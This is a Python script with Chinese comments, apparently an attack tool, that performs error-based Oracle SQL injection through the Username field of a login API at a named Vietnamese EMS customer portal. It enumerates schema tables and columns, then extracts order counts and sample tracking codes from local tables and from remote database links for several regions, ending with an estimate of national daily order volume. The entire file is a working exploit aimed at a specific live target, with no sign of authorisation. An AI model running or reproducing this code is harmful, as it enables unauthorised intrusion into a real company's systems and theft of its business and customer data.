#!/usr/bin/env python3
"""
查询远程数据库链接的数据
"""

import requests
import json
import time

class RemoteDBQuery:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        """发送SQL注入payload"""
        data = {"Username": payload, "Password": "test"}
        try:
            response = self.session.post(
                self.target_url,
                data=json.dumps(data),
                timeout=30
            )
            return response
        except:
            return None
    
    def extract_via_error(self, query):
        """使用Error-based注入提取数据"""
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def query_remote_shipment(self):
        """查询远程数据库的SHIPMENT表"""
        print("=" * 80)
        print("🌐 查询远程数据库的订单数据")
        print("=" * 80)
        
        dblinks = ['XCENTER', 'EMSTRACKING', 'EMSHN', 'EMSHCM', 'EMSGO']
        date = '20251010'
        
        for dblink in dblinks:
            print(f"\n{'='*80}")
            print(f"📊 数据库链接: {dblink}")
            print(f"{'='*80}")
            
            # 查询SHIPMENT表
            queries = [
                (f"10月10日订单数", 
                 f"SELECT COUNT(*) FROM SHIPMENT@{dblink} WHERE CREATE_DATE='{date}'"),
                
                (f"10月份总订单", 
                 f"SELECT COUNT(*) FROM SHIPMENT@{dblink} WHERE CREATE_DATE LIKE '202510%'"),
                
                (f"总订单数", 
                 f"SELECT COUNT(*) FROM SHIPMENT@{dblink} WHERE ROWNUM<=100000"),
            ]
            
            for name, query in queries:
                print(f"\n🔎 {name}:")
                result = self.extract_via_error(query)
                if result:
                    print(f"   ✅ {result}")
                else:
                    print(f"   ❌ 查询失败或无权限")
                time.sleep(1.5)
    
    def query_remote_e1e2(self):
        """查询远程数据库的E1E2_PH表"""
        print("\n" + "=" * 80)
        print("📮 查询远程数据库的邮件数据")
        print("=" * 80)
        
        dblinks = ['XCENTER', 'EMSTRACKING', 'EMSHN', 'EMSHCM']
        date = '20251010'
        
        for dblink in dblinks:
            print(f"\n{'='*80}")
            print(f"📊 数据库链接: {dblink}")
            print(f"{'='*80}")
            
            queries = [
                (f"10月10日MABC数", 
                 f"SELECT COUNT(DISTINCT MABC) FROM E1E2_PH@{dblink} WHERE NGAY='{date}'"),
                
                (f"10月10日总记录", 
                 f"SELECT COUNT(*) FROM E1E2_PH@{dblink} WHERE NGAY='{date}'"),
            ]
            
            for name, query in queries:
                print(f"\n🔎 {name}:")
                result = self.extract_via_error(query)
                if result:
                    print(f"   ✅ {result}")
                else:
                    print(f"   ❌ 查询失败")
                time.sleep(1.5)
    
    def check_shipment_related_tables(self):
        """检查SHIPMENT相关表"""
        print("\n" + "=" * 80)
        print("📦 检查SHIPMENT相关表的数据")
        print("=" * 80)
        
        date = '20251010'
        
        tables = [
            'SHIPMENT',
            'SHIPMENT_SO',
            'SHIPMENT_TMP'
        ]
        
        for table in tables:
            print(f"\n{'='*80}")
            print(f"📊 表: EMS.{table}")
            print(f"{'='*80}")
            
            # 总记录数
            query1 = f"SELECT COUNT(*) FROM EMS.{table}"
            total = self.extract_via_error(query1)
            if total:
                print(f"   总记录数: {total}")
            
            # 10月10日数据
            query2 = f"SELECT COUNT(*) FROM EMS.{table} WHERE CREATE_DATE='{date}'"
            today = self.extract_via_error(query2)
            if today:
                print(f"   10月10日: {today}")
            
            # 10月份数据
            query3 = f"SELECT COUNT(*) FROM EMS.{table} WHERE CREATE_DATE LIKE '202510%'"
            month = self.extract_via_error(query3)
            if month:
                print(f"   10月份: {month}")
            
            time.sleep(2)
    
    def check_donhang_table(self):
        """深入检查DONHANG表"""
        print("\n" + "=" * 80)
        print("📋 深入分析DONHANG表（订单表）")
        print("=" * 80)
        
        # 查看字段
        print("\n🔎 DONHANG表的字段:")
        for i in range(1, 20):
            query = f"SELECT COLUMN_NAME FROM (SELECT COLUMN_NAME, ROWNUM AS RN FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='DONHANG' AND OWNER='EMS' ORDER BY COLUMN_ID) WHERE RN={i}"
            col = self.extract_via_error(query)
            if col:
                print(f"   {i:2}. {col}")
            time.sleep(0.8)
        
        # 查看最新数据日期
        print("\n🔎 DONHANG表数据范围:")
        date_fields = ['NGAY', 'CREATE_DATE', 'ORDER_DATE', 'DATE_LOG', 'CREATED_DATE']
        
        for field in date_fields:
            query = f"SELECT MAX({field}) FROM EMS.DONHANG"
            max_date = self.extract_via_error(query)
            if max_date and max_date != 'NULL':
                print(f"   {field}最新日期: {max_date}")
                time.sleep(1)
    
    def check_delivery_table(self):
        """深入检查DELIVERY表"""
        print("\n" + "=" * 80)
        print("🚚 深入分析DELIVERY表（配送表）")
        print("=" * 80)
        
        # 查看字段
        print("\n🔎 DELIVERY表的字段:")
        for i in range(1, 20):
            query = f"SELECT COLUMN_NAME FROM (SELECT COLUMN_NAME, ROWNUM AS RN FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='DELIVERY' AND OWNER='EMS' ORDER BY COLUMN_ID) WHERE RN={i}"
            col = self.extract_via_error(query)
            if col:
                print(f"   {i:2}. {col}")
            time.sleep(0.8)
    
    def check_e1e2_view(self):
        """检查E1E2_PH_VIEW视图"""
        print("\n" + "=" * 80)
        print("👁️  检查E1E2_PH_VIEW视图")
        print("=" * 80)
        
        date = '20251010'
        
        queries = [
            ("视图10月10日数据", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH_VIEW WHERE NGAY='{date}'"),
            
            ("视图样本数据", 
             f"SELECT MABC FROM EMS.E1E2_PH_VIEW WHERE NGAY='{date}' AND ROWNUM<=5"),
        ]
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ {result}")
            time.sleep(1.5)
    
    def estimate_total_volume(self):
        """估算全国总订单量"""
        print("\n" + "=" * 80)
        print("📊 估算全国总订单量")
        print("=" * 80)
        
        print("\n💡 基于发现的数据:")
        print(f"   本地数据库（当前）:")
        print(f"     - SHIPMENT: 2,315个订单")
        print(f"     - E1E2_PH: 345个MABC")
        print(f"     - 合计: ~2,660个")
        
        print(f"\n   发现9个数据库链接:")
        print(f"     - EMSHN（河内）")
        print(f"     - EMSHCM（胡志明市）")
        print(f"     - EMSGO（其他地区）")
        print(f"     - XCENTER（中央）")
        print(f"     - 等等...")
        
        print(f"\n   如果每个地区2,000-3,000单:")
        print(f"     9个地区 × 2,500 = 22,500单/天")
        print(f"     或者XCENTER包含全国汇总数据")
        
        print(f"\n💡 越南EMS真实日订单量估算:")
        print(f"     保守估计: 20,000 - 30,000单/天 ✅")
        print(f"     这个数字对第一物流公司是合理的！")
    
    def run_query(self):
        """执行所有查询"""
        print("=" * 80)
        print("🌐 远程数据库查询工具")
        print("=" * 80)
        
        # 测试连接
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功")
        
        # 查询本地表
        self.check_shipment_related_tables()
        self.check_donhang_table()
        self.check_delivery_table()
        self.check_e1e2_view()
        
        # 查询远程数据库
        self.query_remote_shipment()
        self.query_remote_e1e2()
        
        # 估算
        self.estimate_total_volume()
        
        print("\n" + "=" * 80)
        print("🎉 查询完成！")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    querier = RemoteDBQuery(target_url)
    querier.run_query()
